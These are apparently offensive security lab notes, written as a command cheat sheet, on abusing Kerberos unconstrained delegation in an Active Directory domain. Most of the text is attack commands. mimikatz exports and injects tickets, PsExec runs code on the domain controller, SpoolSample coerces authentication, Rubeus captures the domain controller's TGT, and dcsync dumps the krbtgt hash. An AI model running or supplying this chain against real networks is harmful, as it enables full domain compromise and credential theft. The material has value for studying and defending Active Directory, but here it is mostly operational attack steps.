#Enumerate computers configured with unconstrained delegation 
Get-DomainComputer -Unconstrained

Once the computer found, we must either perform lateral movement onto the host or compromise a vulnerable application on that machine.
The goal is to connect as local administrator on the target system or as the service account hosting the application which can freely 
make use of the forwarded tickets it receives from users

Once logged as either local administrator or the service account hosting the application, we need to wait a domain user to connect 
to the application

In our example, we'll simulate this by logging in to the Windows 10 client as the **admin** domain user and browsing to http://appsrv01.

And run the following command in mimikatz

sekurlsa::tickets (We should see the forwardable ticket)
sekurlsa::tickets /export
kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi

#[0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi is the file name of the forwardable ticket exported

#With the TGT for the admin user injected into memory, we can exit Mimikatz and test our access on the domain controller with PsExec:

exit
C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd whoami

#We have achieved code execution on the domain controller since the admin user is a member of the Domain Admins group.

// Unconstrained delegation abuse with automation

#print spooler service is running and available on the domain controller by default without authentication at  \pipe\spoolss
#to test the accessibility and availability

dir \\cdc01\pipe\spoolss

#Rubeus from an administrative command prompt in monitor mode (TGTs), specify a refresh interval of 5 seconds with the /interval option, 
#and filter on the domain controller machine account with the /filteruser option:

Rubeus.exe monitor /interval:5 /filteruser:CDC01$

#Trigger the print spooler change notification with SpoolSample.exe
SpoolSample.exe CDC01 APPSRV01

#Rubeus monitor outputs the Base64-encoded TGT and can also inject the ticket into memory with the ptt command
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...

#In this example, With the TGT of the domain controller machine account injected into memory, we can perform actions in the context 
#of that TGT. However, the CDC01$ account is not a local administrator on the domain controller so we cannot directly perform lateral 
#movement with it.

#On the other hand, the account has domain replication permissions, which means we can perform dcsync and dump the password hash 
#of any user, including the special krbtgt account with mimikatz:

lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt